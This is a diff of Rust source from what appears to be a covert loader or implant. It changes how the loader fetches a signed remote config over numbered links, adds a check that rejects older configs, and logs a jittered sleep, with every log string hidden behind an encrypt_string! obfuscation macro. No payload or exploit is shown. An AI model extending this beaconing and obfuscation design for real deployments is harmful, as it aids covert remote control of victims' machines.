@@ -1,4 +1,5 @@
 use crate::dataoperation::{DataOperation, UnApplyDataOperation};
+use crate::poollink::Advanced;
 use rand::Rng;
 use serde::{Deserialize, Serialize};
 use std::io::Read;
@@ -26,17 +27,19 @@ impl Link {
     pub fn print_link_compact(&self) {
         info!("{:?}", self);
     }
-
-    pub fn fetch_config(&self, config: &Config) -> Result<Config, anyhow::Error> {
+    /*
+    pub fn fetch_config(&self, config: &Config, advanced:Advanced,link_nb:i32) -> Result<Config, anyhow::Error> {
         let result = self.fetch_data();
         let data = match result {
             Ok(data) => data,
-            Err(error) => bail!("{}{}", encrypt_string!("fetch_data fail: "), error),
+            Err(error) => bail!("{}{}{}{}", encrypt_string!("link "),link_nb,encrypt_string!(" fetch_data() error: "), error),
         };
         debug!("{}", encrypt_string!("deserialized data"));
         let newconfig: Config = match serde_json::from_slice(&data) {
             Ok(newconfig) => newconfig,
-            Err(error) => bail!("{}{}", encrypt_string!("deserialized data fail: "), error),
+            //Err(error) => bail!("{}{}", encrypt_string!("deserialized data fail: "), error),
+            Err(error) => bail!("{}{}{}{}", encrypt_string!("link "),link_nb,encrypt_string!(" deserialized data error: "), error),
+
         };
         match config.verify_newloader_sign(&newconfig) {
             Ok(()) => {
@@ -44,7 +47,94 @@ impl Link {
                 Ok(newconfig)
             }
             _unspecified => bail!("{}", encrypt_string!("config signature: verify FAIL")),
+            //            Err(error) => bail!("{}{}{}{}", encrypt_string!("link "),link_nb,encrypt_string!(" deserialized data error: "), error),
+
         }
+        todo!();
+
+     */
+
+    pub fn fetch_config(
+        &self,
+        config: &Config,
+        advanced: Advanced,
+        link_nb: i32,
+    ) -> Result<Config, anyhow::Error> {
+        let result = self.fetch_data();
+        let data = match result {
+            Ok(data) => data,
+            Err(error) => bail!(
+                "{}{}{}{}",
+                encrypt_string!("link "),
+                link_nb,
+                encrypt_string!(" fetch_data() error: "),
+                error
+            ),
+        };
+        debug!("{}", encrypt_string!("deserialized data"));
+        let newconfig: Config = match serde_json::from_slice(&data) {
+            Ok(newconfig) => newconfig,
+            //Err(error) => bail!("{}{}", encrypt_string!("deserialized data fail: "), error),
+            Err(error) => bail!(
+                "{}{}{}{}",
+                encrypt_string!("link "),
+                link_nb,
+                encrypt_string!(" deserialized data error: "),
+                error
+            ),
+        };
+        /*
+        match config.verify_newloader_sign(&newconfig) {
+            Ok(()) => {
+                info!(
+                    "{}{}{}",
+                    encrypt_string!("link "),
+                    link_nb,
+                    encrypt_string!(" config signature: VERIFIED")
+                );
+                Ok(newconfig)
+            }
+            _unspecified => //bail!("{}", encrypt_string!("config signature: verify FAIL")),
+            bail!(
+                "{}{}{}",
+                encrypt_string!("link "),
+                link_nb,
+                encrypt_string!(" config signature: verify FAIL")
+            )
+        } */
+        match config.verify_newloader_sign(&newconfig) {
+            Ok(()) => {
+                ()
+            }
+            _unspecified =>
+            //bail!("{}", encrypt_string!("config signature: verify FAIL")),
+            {
+                bail!(
+                    "{}{}{}",
+                    encrypt_string!("link "),
+                    link_nb,
+                    encrypt_string!(" config signature: verify FAIL")
+                )
+            }
+        }
+
+        if advanced.accept_old == false {
+            if config.date > newconfig.date {
+                bail!(
+                    "{}{}{}",
+                    encrypt_string!("link "),
+                    link_nb,
+                    encrypt_string!(" config date: TOO OLD")
+                )
+            }
+        };
+        info!(
+            "{}{}{}",
+            encrypt_string!("link "),
+            link_nb,
+            encrypt_string!(" config signature: VERIFIED")
+        );
+        Ok(newconfig)
     }
 }
 
@@ -92,7 +182,9 @@ pub trait LinkFetch {
 
         let jitt = (self.get_jitt() as f64) * random_number;
         let total_sleep = (self.get_sleep() as f64) + jitt;
-        info!("{}{}", encrypt_string!("sleep: "), total_sleep);
+        if total_sleep != 0.0 {
+            info!("{}{}", encrypt_string!("sleep: "), total_sleep);
+        };
         let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
         thread::sleep(sleep_time);
     }
